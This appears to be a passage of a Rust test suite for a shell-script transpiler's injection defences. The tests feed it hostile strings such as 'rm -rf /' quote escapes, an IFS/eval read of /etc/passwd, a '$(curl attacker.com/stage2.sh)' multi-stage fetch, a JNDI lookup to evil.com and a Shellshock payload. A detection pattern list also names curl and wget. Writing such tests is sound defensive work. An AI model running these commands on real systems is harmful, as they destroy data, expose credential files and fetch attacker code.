fn test_injection_quote_escape() {
    let source = r#"
        fn main() {
            let cmd = "'; rm -rf /; echo '";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Quote escape injection");
}

#[test]
fn test_injection_double_quote_escape() {
    let source = r#"
        fn main() {
            let cmd = "\"; rm -rf /; echo \"";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Double quote escape injection");
}

// ============================================================================
// CATEGORY 7: Environment Variable Manipulation
// ============================================================================

#[test]
fn test_injection_ifs_manipulation() {
    let source = r#"
        fn main() {
            let attack = "IFS=';';eval$(cat /etc/passwd)";
            echo(attack);
        }
    "#;

    assert_rejects_malicious(source, "IFS manipulation attack");
}

#[test]
fn test_injection_path_manipulation() {
    let source = r#"
        fn main() {
            let attack = "PATH=/tmp:$PATH";
            echo(attack);
        }
    "#;

    // PATH in string literal is safe if quoted
    let config = Config::default();
    let result = transpile(source, &config);

    assert!(result.is_ok(), "PATH in string literal should be allowed");
}

// ============================================================================
// CATEGORY 8: Here-doc and Here-string Attacks
// ============================================================================

#[test]
fn test_injection_heredoc_syntax() {
    let source = r#"
        fn main() {
            let attack = "<< EOF\nrm -rf /\nEOF";
            echo(attack);
        }
    "#;

    assert_rejects_malicious(source, "Here-doc syntax injection");
}

// ============================================================================
// CATEGORY 9: Complex Multi-stage Attacks
// ============================================================================

#[test]
fn test_complex_injection_chain() {
    let source = r#"
        fn main() {
            let stage1 = "$(curl attacker.com/stage2.sh)";
            let stage2 = "; eval $stage1";
            echo(stage2);
        }
    "#;

    assert_rejects_malicious(source, "Multi-stage injection");
}

#[test]
fn test_obfuscated_injection() {
    let source = r#"
        fn main() {
            let obf = "$((0x72))$((0x6d))";  // hex for "rm"
            echo(obf);
        }
    "#;

    // Arithmetic expansion should be safe in strings
    let config = Config::default();
    let result = transpile(source, &config);

    match result {
        Ok(script) => {
            // Should be quoted
            assert!(
                script.contains("'$((") || script.contains("\"$(("),
                "Arithmetic expansion not quoted"
            );
        }
        Err(_) => {}
    }
}

// ============================================================================
// CATEGORY 10: Real-world Attack Patterns
// ============================================================================

#[test]
fn test_real_world_log4j_style() {
    let source = r#"
        fn main() {
            let user_agent = "${jndi:ldap://evil.com/a}";
            echo(user_agent);
        }
    "#;

    // JNDI-style attacks should be safe in quoted strings
    let config = Config::default();
    let result = transpile(source, &config);

    assert!(result.is_ok(), "JNDI syntax in string should be quoted");
}

#[test]
fn test_real_world_shellshock() {
    let source = r#"
        fn main() {
            let env_var = "() { :; }; /bin/bash -c 'cat /etc/passwd'";
            echo(env_var);
        }
    "#;

    assert_rejects_malicious(source, "Shellshock-style attack");
}

#[test]
fn test_semicolon_in_filename_is_safe() {
    // Bare semicolons in double-quoted strings are safe in shell
    // filename='file.txt; rm -rf /' followed by echo "${filename}" is NOT injection
    let source = r#"
        fn main() {
            let filename = "file.txt; rm -rf /";
            echo(filename);
        }
    "#;

    assert_transpiles_ok(source, "Bare semicolon in filename string is safe");
}

// ============================================================================
// CATEGORY 11: Validation Framework Tests
// ============================================================================

#[test]
fn test_validation_catches_known_patterns() {
    // Test that our validation catches known-bad patterns
    // Note: bare "; " is NOT dangerous inside double-quoted shell strings
    let patterns = vec!["| cat", "$(curl", "`wget", "&& malicious", "|| evil"];

    for pattern in patterns {
        let source = format!(
            r#"
            fn main() {{
                let cmd = "{}";
                echo(cmd);
            }}
        "#,
            pattern
        );

        assert_rejects_malicious(&source, &format!("Pattern: {}", pattern));
    }
}

#[test]
fn test_safe_strings_allowed() {
    // Verify we don't have false positives
    let safe_strings = vec![
        "Hello, World!",
        "File version 1.0",
        "user@example.com",
        "https://safe-url.com",
        "Price: $19.99",
    ];

    for safe in safe_strings {
        let source = format!(
            r#"
            fn main() {{
                let msg = "{}";
                echo(msg);
            }}
        "#,
            safe
        );

        let config = Config::default();
        let result = transpile(&source, &config);

        assert!(result.is_ok(), "Safe string '{}' should be allowed", safe);
    }
}
